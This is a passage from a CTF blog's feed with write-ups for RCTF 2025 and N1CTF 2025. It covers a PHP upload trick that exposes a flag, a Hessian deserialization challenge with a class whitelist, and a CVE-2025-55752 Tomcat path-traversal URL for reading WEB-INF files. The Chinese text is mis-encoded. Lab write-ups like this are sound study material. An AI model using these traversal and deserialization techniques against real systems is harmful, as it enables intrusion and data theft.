class="token punctuation">]</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token punctuation">]</span><span class="token punctuation">,</span>    <span class="token string single-quoted-string">'tmp_name'</span> <span class="token operator">=></span> <span class="token variable">$files</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token punctuation">]</span><span class="token punctuation">,</span>    <span class="token string single-quoted-string">'error'</span> <span class="token operator">=></span> <span class="token variable">$files</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'error'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token punctuation">]</span><span class="token punctuation">,</span>    <span class="token string single-quoted-string">'size'</span> <span class="token operator">=></span> <span class="token variable">$files</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'size'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$result</span> <span class="token operator">=</span> <span class="token class-name static-context">Photo</span><span class="token operator">::</span><span class="token function">create</span><span class="token punctuation">(</span><span class="token punctuation">[</span>    <span class="token string single-quoted-string">'user_id'</span> <span class="token operator">=></span> <span class="token class-name static-context">Auth</span><span class="token operator">::</span><span class="token function">id</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>    <span class="token string single-quoted-string">'original_filename'</span> <span class="token operator">=></span> <span class="token variable">$file</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">,</span>    <span class="token string single-quoted-string">'saved_filename'</span> <span class="token operator">=></span> <span class="token variable">$savedFilename</span><span class="token punctuation">,</span>    <span class="token string single-quoted-string">'type'</span> <span class="token operator">=></span> <span class="token variable">$file</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'type'</span><span class="token punctuation">]</span><span class="token punctuation">,</span>    <span class="token string single-quoted-string">'size'</span> <span class="token operator">=></span> <span class="token variable">$file</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'size'</span><span class="token punctuation">]</span><span class="token punctuation">,</span>    <span class="token string single-quoted-string">'width'</span> <span class="token operator">=></span> <span class="token variable">$exifData</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'width'</span><span class="token punctuation">]</span><span class="token punctuation">,</span>    <span class="token string single-quoted-string">'height'</span> <span class="token operator">=></span> <span class="token variable">$exifData</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'height'</span><span class="token punctuation">]</span><span class="token punctuation">,</span>    <span class="token string single-quoted-string">'exif_make'</span> <span class="token operator">=></span> <span class="token variable">$exifData</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'make'</span><span class="token punctuation">]</span><span class="token punctuation">,</span>    <span class="token string single-quoted-string">'exif_model'</span> <span class="token operator">=></span> <span class="token variable">$exifData</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'model'</span><span class="token punctuation">]</span><span class="token punctuation">,</span>    <span class="token string single-quoted-string">'exif_exposure_time'</span> <span class="token operator">=></span> <span class="token variable">$exifData</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'exposure_time'</span><span class="token punctuation">]</span><span class="token punctuation">,</span>    <span class="token string single-quoted-string">'exif_f_number'</span> <span class="token operator">=></span> <span class="token variable">$exifData</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'f_number'</span><span class="token punctuation">]</span><span class="token punctuation">,</span>    <span class="token string single-quoted-string">'exif_iso'</span> <span class="token operator">=></span> <span class="token variable">$exifData</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'iso'</span><span class="token punctuation">]</span><span class="token punctuation">,</span>    <span class="token string single-quoted-string">'exif_focal_length'</span> <span class="token operator">=></span> <span class="token variable">$exifData</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'focal_length'</span><span class="token punctuation">]</span><span class="token punctuation">,</span>    <span class="token string single-quoted-string">'exif_date_taken'</span> <span class="token operator">=></span> <span class="token variable">$exifData</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'date_taken'</span><span class="token punctuation">]</span><span class="token punctuation">,</span>    <span class="token string single-quoted-string">'exif_artist'</span> <span class="token operator">=></span> <span class="token variable">$exifData</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'artist'</span><span class="token punctuation">]</span><span class="token punctuation">,</span>    <span class="token string single-quoted-string">'exif_copyright'</span> <span class="token operator">=></span> <span class="token variable">$exifData</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'copyright'</span><span class="token punctuation">]</span><span class="token punctuation">,</span>    <span class="token string single-quoted-string">'exif_software'</span> <span class="token operator">=></span> <span class="token variable">$exifData</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'software'</span><span class="token punctuation">]</span><span class="token punctuation">,</span>    <span class="token string single-quoted-string">'exif_orientation'</span> <span class="token operator">=></span> <span class="token variable">$exifData</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'orientation'</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æˆ‘ä»¬åªéœ€è¦æ§åˆ¶ content-type ä¸º -1 å³å¯ï¼Œå» space é‡Œçš„ blog å†™ç‚¹ä¸œè¥¿ä¼ å›¾ç‰‡</p><p><img src="/blog/2025/11/15/RCTF-2025/IMG-20251117010943823.png"></p><p>ç„¶åè®¾ç½®å›¾ç‰‡ä¸º background</p><p><img src="/blog/2025/11/15/RCTF-2025/IMG-20251117011019625.png"></p><p>å†è®¿é—® superadmin.php å³å¯å¾—åˆ° flagï¼š<code>RCTF&#123;h4rd_70_54y_wh37h3r_175_4_bu6_0r_4_f347ur3&#125;</code></p><hr><h1 id="maybe-easyï¼ˆUnsolvedï¼‰"><a href="#maybe-easyï¼ˆUnsolvedï¼‰" class="headerlink" title="maybe_easyï¼ˆUnsolvedï¼‰"></a>maybe_easyï¼ˆUnsolvedï¼‰</h1><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token annotation punctuation">@Controller</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">RCTFController</span> <span class="token punctuation">&#123;</span>    <span class="token annotation punctuation">@RequestMapping</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token string">"/hello"</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>    <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">hello</span><span class="token punctuation">(</span><span class="token annotation punctuation">@RequestParam</span><span class="token punctuation">(</span>name <span class="token operator">=</span> <span class="token string">"data"</span><span class="token punctuation">,</span>required <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">)</span> <span class="token class-name">String</span> data<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">Object</span> obj <span class="token operator">=</span> <span class="token class-name">HessianFactory</span><span class="token punctuation">.</span><span class="token function">deserialize</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token string">"hello"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æ˜æ˜¾æ˜¯ Hessian ååºåˆ—åŒ–</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>rctf<span class="token punctuation">.</span>server<span class="token punctuation">.</span>tool</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>caucho<span class="token punctuation">.</span>hessian<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">Hessian2Input</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>caucho<span class="token punctuation">.</span>hessian<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">Hessian2Output</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>caucho<span class="token punctuation">.</span>hessian<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">SerializerFactory</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">ByteArrayInputStream</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">ByteArrayOutputStream</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">IOException</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">Base64</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">HashSet</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">Set</span></span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">HessianFactory</span> <span class="token keyword">extends</span> <span class="token class-name">SerializerFactory</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">final</span> <span class="token class-name">Set</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">String</span><span class="token punctuation">></span></span> <span class="token constant">WHITE_PACKAGES</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HashSet</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token class-name">HessianFactory</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token class-name">ClassLoader</span> <span class="token function">getClassLoader</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">WhiteListClassLoader</span><span class="token punctuation">(</span><span class="token keyword">super</span><span class="token punctuation">.</span><span class="token function">getClassLoader</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">T</span><span class="token punctuation">></span></span> <span class="token class-name">String</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token class-name">T</span> object<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">ByteArrayOutputStream</span> byteArrayOutputStream <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ByteArrayOutputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Hessian2Output</span> hessian2Output <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Hessian2Output</span><span class="token punctuation">(</span>byteArrayOutputStream<span class="token punctuation">)</span><span class="token punctuation">;</span>        hessian2Output<span class="token punctuation">.</span><span class="token function">getSerializerFactory</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">setAllowNonSerializable</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        hessian2Output<span class="token punctuation">.</span><span class="token function">writeObject</span><span class="token punctuation">(</span>object<span class="token punctuation">)</span><span class="token punctuation">;</span>        hessian2Output<span class="token punctuation">.</span><span class="token function">flushBuffer</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token class-name">Base64</span><span class="token punctuation">.</span><span class="token function">getEncoder</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">encodeToString</span><span class="token punctuation">(</span>byteArrayOutputStream<span class="token punctuation">.</span><span class="token function">toByteArray</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token class-name">Object</span> <span class="token function">deserialize</span><span class="token punctuation">(</span><span class="token class-name">String</span> s<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">IOException</span><span class="token punctuation">,</span> <span class="token class-name">ClassNotFoundException</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> data <span class="token operator">=</span> <span class="token class-name">Base64</span><span class="token punctuation">.</span><span class="token function">getDecoder</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">decode</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">ByteArrayInputStream</span> bis <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ByteArrayInputStream</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Hessian2Input</span> h2i <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Hessian2Input</span><span class="token punctuation">(</span>bis<span class="token punctuation">)</span><span class="token punctuation">;</span>        h2i<span class="token punctuation">.</span><span class="token function">setSerializerFactory</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">HessianFactory</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> h2i<span class="token punctuation">.</span><span class="token function">readObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">static</span> <span class="token punctuation">&#123;</span>        <span class="token constant">WHITE_PACKAGES</span><span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token string">"com.rctf.server.tool."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token constant">WHITE_PACKAGES</span><span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token string">"java.util."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token constant">WHITE_PACKAGES</span><span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token string">"org.apache.commons.logging."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token constant">WHITE_PACKAGES</span><span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token string">"org.springframework.beans."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token constant">WHITE_PACKAGES</span><span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token string">"org.springframework.jndi."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">class</span> <span class="token class-name">WhiteListClassLoader</span> <span class="token keyword">extends</span> <span class="token class-name">ClassLoader</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">private</span> <span class="token keyword">final</span> <span class="token class-name">ClassLoader</span> parent<span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token class-name">WhiteListClassLoader</span><span class="token punctuation">(</span><span class="token class-name">ClassLoader</span> parent<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">super</span><span class="token punctuation">(</span>parent<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">this</span><span class="token punctuation">.</span>parent <span class="token operator">=</span> parent<span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">protected</span> <span class="token class-name">Class</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token operator">?</span><span class="token punctuation">></span></span> <span class="token function">loadClass</span><span class="token punctuation">(</span><span class="token class-name">String</span> name<span class="token punctuation">,</span> <span class="token keyword">boolean</span> resolve<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">ClassNotFoundException</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">boolean</span> allowed <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>            <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token class-name">String</span> prefix <span class="token operator">:</span> <span class="token class-name">HessianFactory</span><span class="token punctuation">.</span><span class="token constant">WHITE_PACKAGES</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span>name<span class="token punctuation">.</span><span class="token function">startsWith</span><span class="token punctuation">(</span>prefix<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                    allowed <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>                    <span class="token keyword">break</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span>            <span class="token punctuation">&#125;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>allowed<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">ClassNotFoundException</span><span class="token punctuation">(</span><span class="token string">"Class not allowed for deserialization: "</span> <span class="token operator">+</span> name<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>                <span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">.</span>parent<span class="token punctuation">.</span><span class="token function">loadClass</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ç™½åå•ï¼Œè§‚å¯Ÿä¸€ä¸‹ com.rctf.server.tool.Maybe</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">Serializable</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span></span><span class="token class-name">InvocationHandler</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span></span><span class="token class-name">Method</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span></span><span class="token class-name">Proxy</span></span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Maybe</span> <span class="token keyword">extends</span> <span class="token class-name">Proxy</span> <span class="token keyword">implements</span> <span class="token class-name">Comparable</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Object</span><span class="token punctuation">></span></span><span class="token punctuation">,</span> <span class="token class-name">Serializable</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token class-name">Maybe</span><span class="token punctuation">(</span><span class="token class-name">InvocationHandler</span> h<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">super</span><span class="token punctuation">(</span>h<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">int</span> <span class="token function">compareTo</span><span class="token punctuation">(</span><span class="token class-name">Object</span> o<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>            <span class="token class-name">Method</span> method <span class="token operator">=</span> <span class="token class-name">Comparable</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">getMethod</span><span class="token punctuation">(</span><span class="token string">"compareTo"</span><span class="token punctuation">,</span> <span class="token class-name">Object</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token class-name">Object</span> result <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>h<span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">,</span> method<span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span>o<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token class-name">Integer</span><span class="token punctuation">)</span>result<span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Throwable</span> e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">RuntimeException</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ç›´æ¥è¿½åˆ°å‡ºé¢˜äººåšå®¢ï¼š <a href="https://blog.potatowo.top/2024/11/12/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BHessian/">https://blog.potatowo.top/2024/11/12/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BHessian/</a></p><hr>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;å‰è¨€&quot;&gt;&lt;a href=&quot;#å‰è¨€&quot; class=&quot;headerlink&quot; title=&quot;å‰è¨€&quot;&gt;&lt;/a&gt;å‰è¨€&lt;/h1&gt;&lt;p&gt;å‚è€ƒï¼š&lt;/p&gt;
&lt;p&gt;n1 çš„ wpï¼š &lt;a href=&quot;https://wx.zsxq.com/group/824215518412&quot;&gt;https://wx.zsxq.com/group/824215518412&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;ROIS å®˜æ–¹çš„ wpï¼š &lt;a href=&quot;https://github.com/team-rois/RCTF2025/blob/ba05089e81ae1950e27fa7d7ce24af6705a3716b/&quot;&gt;https://github.com/team-rois/RCTF2025/blob/ba05089e81ae1950e27fa7d7ce24af6705a3716b/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;SU çš„ wpï¼š &lt;a href=&quot;https://su-team.cn/post/rctf-2025-su-wu/&quot;&gt;https://su-team.cn/post/rctf-2025-su-wu/&lt;/a&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="CTFçº¿ä¸Šèµ›" scheme="http://c1oudfl0w0.github.io/blog/categories/CTF%E7%BA%BF%E4%B8%8A%E8%B5%9B/"/>
    
    
  </entry>
  
  <entry>
    <title>N1CTF 2025</title>
    <link href="http://c1oudfl0w0.github.io/blog/2025/11/02/N1CTF-2025/"/>
    <id>http://c1oudfl0w0.github.io/blog/2025/11/02/N1CTF-2025/</id>
    <published>2025-11-01T16:56:08.000Z</published>
    <updated>2025-11-14T17:38:01.451Z</updated>
    
    <content type="html"><![CDATA[<h1 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h1><p>æ‰“ä¸€åŠå€¦äº†ï¼Œæ²¡ç²¾åŠ›æ‰“åªèƒ½åé¢å¤ç°ä¸‹é¢˜ç›®</p><p>å‚è€ƒï¼š</p><p><a href="https://gsbp0.github.io/post/2025n1ctf-wp-for-n1cateezzjs/">https://gsbp0.github.io/post/2025n1ctf-wp-for-n1cateezzjs/</a></p><span id="more"></span><hr><h1 id="n1catï¼ˆå¤ç°ï¼‰"><a href="#n1catï¼ˆå¤ç°ï¼‰" class="headerlink" title="n1catï¼ˆå¤ç°ï¼‰"></a>n1catï¼ˆå¤ç°ï¼‰</h1><blockquote><p>CVE-2025-55752 + é«˜ç‰ˆæœ¬ JNDI æ³¨å…¥ + æœ€æ–°æœ€çƒ­ jdk17 åŸç”Ÿé“¾</p></blockquote><p>ç»™äº†ä¸€ä¸ª apache é…ç½®æ–‡ä»¶</p><pre class="line-numbers language-ini" data-language="ini"><code class="language-ini"><span class="token key attr-name">RewriteCond %&#123;QUERY_STRING&#125; (^|&amp;)path</span><span class="token punctuation">=</span><span class="token value attr-value">([^&amp;]+)</span>RewriteRule ^/download$ /%2 [B,L]<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>&#x2F;download è·¯ç”±æ¥æ”¶ä¸€ä¸ª path å‚æ•°</p><p>æµ‹è¯•å‘ç°æœåŠ¡å™¨ç‰ˆæœ¬ä¸º Tomcat&#x2F;9.0.108</p><p>æœ‰ CVE-2025-55752ï¼š<a href="https://cn-sec.com/archives/4639480.html">https://cn-sec.com/archives/4639480.html</a></p><p>é‚£ä¹ˆæ„é€  urlï¼š<code>/download?path=%2fWEB-INF/web.xml</code></p><p>web.xml</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>web-app</span> <span class="token attr-name">xmlns</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://xmlns.jcp.org/xml/ns/javaee<span class="token punctuation">"</span></span> <span class="token attr-name"><span class="token namespace">xmlns:</span>xsi</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://www.w3.org/2001/XMLSchema-instance<span class="token punctuation">"</span></span> <span class="token attr-name"><span class="token namespace">xsi:</span>schemaLocation</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://xmlns.jcp.org/xml/ns/javaee http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd<span class="token punctuation">"</span></span> <span class="token attr-name">version</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>4.0<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>servlet</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>servlet-name</span><span class="token punctuation">></span></span>welcomeServlet<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>servlet-name</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>servlet-class</span><span class="token punctuation">></span></span>ctf.n1cat.welcomeServlet<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>servlet-class</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>servlet</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>servlet-mapping</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>servlet-name</span><span class="token punctuation">></span></span>welcomeServlet<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>servlet-name</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>url-pattern</span><span class="token punctuation">></span></span>/<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>url-pattern</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>servlet-mapping</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>web-app</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>å¾—çŸ¥ç±»åç§°ä¸è·¯å¾„ <code>/download?path=%2fWEB-INF/classes/ctf/n1cat/welcomeServlet.class</code></p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">ctf<span class="token punctuation">.</span>n1cat</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>fasterxml<span class="token 